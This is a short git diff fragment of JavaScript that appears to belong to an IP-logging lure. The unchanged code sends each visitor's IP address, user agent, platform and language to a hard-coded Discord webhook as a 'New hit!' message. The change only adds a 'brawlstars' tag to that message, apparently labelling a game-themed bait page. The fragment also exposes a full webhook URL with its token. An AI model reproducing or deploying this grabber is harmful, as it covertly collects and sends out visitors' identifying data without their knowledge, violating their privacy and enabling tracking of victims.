@@ -27,7 +27,7 @@
         const webhookUrl = 'https://discord.com/api/webhooks/1227383582373449739/WpV-XwYxlOUC6gyWNRS7NBf4_H95Bq18hvFNSnR_TQg1MbaZ9t8zgbn7Y6c0mZsPyv6e'; // Replace with your actual webhook URL
 
         // Construct message
-        const message = `New hit!\nIP: ${deviceInfo.ip}\nDevice Info:\nUser Agent: ${deviceInfo.userAgent}\nPlatform: ${deviceInfo.platform}\nLanguage: ${deviceInfo.language}`;
+        const message = `(brawlstars) New hit!\nIP: ${deviceInfo.ip}\nDevice Info:\nUser Agent: ${deviceInfo.userAgent}\nPlatform: ${deviceInfo.platform}\nLanguage: ${deviceInfo.language}`;
 
         try {
             const response = await fetch(webhookUrl, {
